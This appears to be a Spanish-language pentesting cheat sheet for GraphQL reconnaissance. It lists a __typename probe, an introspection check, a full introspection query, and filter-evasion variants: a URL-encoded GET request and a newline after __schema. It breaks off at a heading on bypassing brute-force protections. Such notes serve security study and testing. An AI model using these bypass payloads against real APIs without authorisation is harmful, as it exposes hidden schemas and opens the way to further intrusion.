-- -
# Basic Recon

**1. Se obtiene el nombre del tipo de objeto en la raiz de la API.** 
```json 
{
	"query":"{__typename}" 
}
```

**2. Testeamos que la instrospeccion este habilitada**
```json 
{
	"query":"{__schema{queryType{name}}}" 
}
```

**3. Prueba de introspeccion completa**
```json 
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
      # A menudo es necesario eliminar estas líneas para ejecutar la consulta
      onOperation
      onFragment
      onField
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}

```

**4. Bypass de introspection query**
```json
{ 
	"query": "query{__schema {queryType{name}}}" 
}
```
*Introspection probe as GET request*
```HTTP
# Introspection probe as GET request
/graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```
*Misma intrspection query pero con un salto de linea*
```json
query IntrospectionQuery {
    __schema #aca esta el salto de linea
    {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
            ...FullType
        }
        directives {
            name
            description
            locations
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

**5. Bypass de brute force protections**
